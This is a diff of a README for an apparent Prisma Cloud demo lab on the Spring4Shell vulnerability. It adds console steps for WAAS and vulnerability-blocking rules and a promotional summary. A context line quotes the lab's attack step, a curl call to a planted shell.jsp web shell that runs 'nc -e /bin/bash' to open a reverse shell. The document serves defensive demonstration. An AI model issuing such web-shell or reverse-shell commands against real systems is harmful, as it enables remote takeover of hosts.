@@ -42,7 +42,7 @@ ssh -i temp-lab/spring4shell_cloud_breach/terraform/panw ubuntu@<spring4shell-ub
 
 ## Setup WAAS Rule
 1. Go to Prisma Console (Enterprise Edition ONLY) - **Compute > Defend > WAAS > Host**
-2. Click **‘Add Rule’**
+2. Click **+ Add Rule**
 3. Rule Name: **Spring4Shell Defense**
 4. Then click in the **'Scope'** field
 5. Make sure there is a Check box next to **All**.  Alternatively you can create a rule specific for this vulnerable Host.
@@ -54,8 +54,17 @@ ssh -i temp-lab/spring4shell_cloud_breach/terraform/panw ubuntu@<spring4shell-ub
 9. Click the **‘App Firewall'** tab and confirm all settings are set to **Alert**, (with exception to Detect Information Leakage which should be set to Disable by default). 
 10. Click **‘Save’**
 
-NOTE: For performing the demo, suggest to **'Disable'** the alert temporarily and Allow Prisma Cloud to Discover the 
-Vulnerable Host and Container in the Radars view after installing the defender during the demo and that it shows that it is an Unprotected Web App.**. 
+NOTE: For performing the demo, suggest to **'Disable'** the alert temporarily, under **Actions** and clicking the 3 dots. and Allow Prisma Cloud to Discover the Vulnerable Host and Container in the Radars view after installing the defender during the demo and that it shows that it is an Unprotected Web App.**. 
+
+## Setup Vulnerability Rule
+1. Go to **Compute > Defend > Vulnerabilities > Images > Deployed** and Click **+ Add Rule**
+2. Enter a name such as: Block Containers with Critical Vulnerabilities
+3. In the **Block threshold** section, change to Block on **Critical**
+4. Then click in the **'Scope'** field
+5. Create a rule specific for this vulnerable Container app.
+    - Step 5a: Click **'Add Collection'**, type in a name, Click in the **Image** field, type in `vuln_app_app`, select it and click **'Save'**
+    - Step 5b: Ensure you have your desired collection box checked and click **'Select collections'**
+6. For performing the demo, **'Disable'** the alert temporarily, under **Actions** and clicking the 3 dots.
 
 ## Pre-Demo verification Steps
 1. Verify on **Compute > Radars > Container** screen, the new vulnerable container has completed learning mode and shows the red firewall with a line through it, indicating it is an unprotected Web App
@@ -113,6 +122,13 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
         - `docker kill <ID>`
     - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
     - You should see a message that Image is blocked by your policy.
+
+## Demo Summary - Highlight the Power of Prisma Cloud
+- Defense in Depth
+- Agentless may be fine for non-public facing workloads, however Agents are a must for any applications you care to protect.
+- We learned we can not only protect about known vulnerabilities, but also Prisma Cloud protects against malicious and anomolous behavior and processes such as reverse shells and recognized laternal movements as only a few examples we demonstrated today.
+- TODO - IMPROVE THIS STATEMENT/DETAIL - Given the statistics (referring to the NIST NVD slide stats), on avg. attackers know an explooit ## of days in advance of companies being able to actually patch against a particaulr threat.
+
 
 ## Future - Build out connection AWS registry, Github repo, full workflow.
 To Do's
